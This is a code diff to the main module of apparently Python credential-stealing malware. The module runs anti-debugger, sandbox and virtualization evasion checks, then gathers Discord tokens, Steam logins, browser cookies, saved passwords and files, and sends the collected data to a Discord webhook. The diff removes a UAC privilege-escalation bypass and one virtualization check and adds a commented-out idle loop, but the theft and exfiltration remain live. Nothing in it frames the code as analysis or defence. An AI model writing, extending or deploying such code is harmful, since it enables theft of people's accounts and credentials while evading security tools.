@@ -21,7 +21,7 @@ from Protections.Nestedvirtualization import NestedVirtualizationChecker
 from Protections.Windowssandbox import WindowsSandboxChecker
 
 from Utilities.Webhook import WebhookEncryptor, retrieve_saved_data
-from Utilities.UAC import UACBypass
+
 
 logging.basicConfig(level=logging.INFO)
 
@@ -98,19 +98,14 @@ class TaskManager:
                 task.cancel()
             await asyncio.sleep(1)
 
-async def run_uac_bypass():
-    uac = UACBypass()
-    success = await uac.run_checks()
-    if success:
-        logging.info("UAC bypass was successful!")
-    else:
-        logging.warning("UAC bypass failed, but continuing execution.")
-
+    
+#For when we want to keep the program running idle in the background to recieve or send data
+#idle_event = asyncio.Event()
 
 async def main(memory_handler: MemoryHandler, task_manager: TaskManager):
-    await run_uac_bypass()
 
     atexit.register(memory_handler.memory_manager.release_memory)
+
     await task_manager.manage()
 
     # Send the saved data to Discord
@@ -119,8 +114,11 @@ async def main(memory_handler: MemoryHandler, task_manager: TaskManager):
         encryptor = WebhookEncryptor()
         encryptor.send_data_to_discord(saved_data)
 
+    # Idle indefinitely waiting for the event (which never gets set)
+    #await idle_event.wait()
+
 if __name__ == "__main__":
-    checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck(), BIOSVersionChecker(), PseudoDevices(), NestedVirtualizationChecker(), WindowsSandboxChecker())
+    checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck(), BIOSVersionChecker(), PseudoDevices(), WindowsSandboxChecker())
     recovery = Recovery(DiscordTokenRecovery(), SteamLoginRecovery(), FileRecovery(), CookieRecovery(), BrowserPasswordRecovery())
     noise_methods = [
         NoiseGenerator.create_noise, 
